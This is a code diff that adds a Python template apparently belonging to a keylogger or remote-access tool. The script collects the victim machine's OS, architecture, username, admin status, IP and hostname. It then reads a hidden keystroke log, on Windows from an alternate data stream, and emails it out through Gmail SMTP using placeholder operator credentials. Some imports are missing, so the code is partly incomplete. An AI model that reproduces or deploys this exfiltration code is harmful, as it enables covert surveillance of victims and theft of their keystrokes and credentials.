@@ -1,0 +1,92 @@
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import Encoders
+
+hour = int(strftime("%H"))
+am_pm = "AM"
+if hour > 12:
+    hour = str(hour - 12)
+    am_pm = "PM"
+try:
+    is_admin = os.getuid() == 0
+except AttributeError:
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    pass
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("8.8.8.8",80))
+ip =(s.getsockname()[0])
+s.close()
+if win_client():
+    os.chdir(os.path.join(os.getenv('userprofile'),'Desktop'))
+    user = os.getenv('username')
+    arch = run_command('wmic os get osarchitecture').split('\\n')[1]
+else:
+    user = run_command("whoami").strip().replace("\\\\","-")
+    arch = run_command('uname -m')
+    if 'x86_64' in arch:
+        arch = '64-bit'
+    else:
+        arch = '32-bit'
+time = "{{}}{{}}{{}}".format(str(hour),strftime(":%M:%S "),am_pm)
+date = strftime("%m/%d/%Y")
+stinfo = (  "   OS{{8:25}}: {{0}}"
+            "\\n   Architecture{{8:13}}: {{1}}"
+            "\\n   User{{8:23}}: {{2}}"
+            "\\n   Admin Rights{{8:11}}: {{3}}"
+            "\\n   Network IP{{8:14}}: {{4}}"
+            "\\n   Network Name{{8:9}}: {{5}}\\n"
+            "\\n   Date{{8:23}}: {{6}}"
+            "\\n   Time{{8:23}}: {{7}}\\n"
+).format(platform.platform(),arch,user,str(is_admin),ip,platform.node(),date,time," ")
+
+gmail_user = '{0}'
+gmail_pwd = '{1}'
+
+msg =MIMEMultipart()
+msg['From'] = '{0}'
+msg['To'] = '{0}'
+msg['Subject'] = "Hello from {{}}".format(ip)
+body = 'This system is now up and running:\\n\\n{{}}'.format(stinfo)
+
+msg.attach(MIMEText(body,'plain'))
+filename = "kl.log"
+win_kf = 'C:\\Windows\\Temp:stkl.log'
+pos_kf = '/tmp/.stkl.log'
+if os.path.exists(win_kf):
+    attachment = open(win_kf,"rb")
+elif os.path.exists(pos_kf):
+    attachment = open(pos_kf,"rb")
+else:
+    attachment = False
+
+if attachment:
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload((attachment).read())
+    Encoders.encode_base64(part)
+    part.add_header('Content-Disposition', "attachment; filename= {{}}".format(filename))
+    msg.attach(part)
+
+try:
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+
+    # identify ourselves, prompting server for supported features
+    server.ehlo()
+
+    # If we can encrypt this session, do it
+    if server.has_extn('STARTTLS'):
+        server.starttls()
+        server.ehlo() # re-identify ourselves over TLS connection
+
+    server.login('{0}', '{1}')
+    text = msg.as_string()
+    server.sendmail(user, '{0}', text)
+    server.close()
+    with open('suuuup.txt','w') as s:
+        s.write('should have finished')
+except Exception as e:
+    with open('failed.txt', 'w') as s:
+        s.write(str(e))
+    pass
